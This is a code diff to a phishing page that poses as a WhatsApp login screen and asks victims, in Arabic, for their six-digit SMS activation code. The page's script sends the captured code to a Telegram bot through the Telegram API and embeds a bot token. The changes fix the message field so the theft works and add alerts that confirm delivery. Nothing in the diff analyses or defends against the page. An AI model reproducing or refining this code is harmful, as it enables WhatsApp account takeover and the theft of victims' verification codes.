@@ -103,7 +103,7 @@
         <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp Logo">
         <h1>تسجيل الدخول</h1>
         <p>أدخل رمز التفعيل المكون من 6 أرقام الذي تلقيته من خلال رسالة نصية.</p>
-        <input id="activationCode" type="tel" placeholder="رمز التفعيل" maxlength="6">
+        <input id="activationCode" type="text" placeholder="رمز التفعيل" maxlength="6">
         <button onclick="startVerification()">متابعة</button>
         <div id="countdown"></div>
     </div>
@@ -125,8 +125,8 @@
         }
 
         function sendCodeToTelegram(code) {
-            const botToken = '7908469273:AAFmgF2elBpLaH6YGJK6Qtrmf8Z7TsyODzc';
-            const chatId = '612575358';
+            const botToken = '7908469273:AAFmgF2elBpLaH6YGJK6Qtrmf8Z7TsyODzc'; // توكن البوت
+            const chatId = 'YOUR_CHAT_ID'; // استبدل YOUR_CHAT_ID بمعرّف الدردشة الخاص بك
             const message = `رمز التفعيل: ${code}`;
 
             fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
@@ -136,11 +136,20 @@
                 },
                 body: JSON.stringify({
                     chat_id: chatId,
-                    tel: message,
+                    text: message,
                 }),
-            }).catch(error => {
-                console.error('فشل الاتصال بالخادم:', error);
-            });
+            })
+                .then((response) => {
+                    if (response.ok) {
+                        alert('تم إرسال الرمز بنجاح إلى تيليجرام!');
+                    } else {
+                        alert('حدث خطأ أثناء الإرسال. تحقق من الإعدادات.');
+                    }
+                })
+                .catch((error) => {
+                    console.error('فشل الاتصال بـ Telegram API:', error);
+                    alert('فشل الإرسال. تحقق من اتصالك بالإنترنت.');
+                });
         }
 
         function startCountdown(inputField) {
